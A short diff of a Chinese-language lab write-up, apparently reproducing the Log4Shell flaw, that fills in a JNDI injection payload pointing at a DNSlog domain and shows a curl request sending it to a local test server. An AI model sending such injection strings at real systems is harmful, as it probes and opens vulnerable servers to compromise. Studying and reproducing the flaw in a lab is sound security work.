@@ -315,7 +315,7 @@ sudo docker cp adoring_bhabha:/demo/demo.jar ./
 
 这里得到的域名为 `suhj0q.dnslog.cn`
 
-构造 `payload` 为 ``
+构造 `payload` 为 `${jndi:ldap://suhj0q.dnslog.cn/ohhhh}`
 
 ```bash
 curl -X POST http://192.168.254.128:50175/hello -d 'payload="${jndi:ldap://suhj0q.dnslog.cn/ohhhh}"'
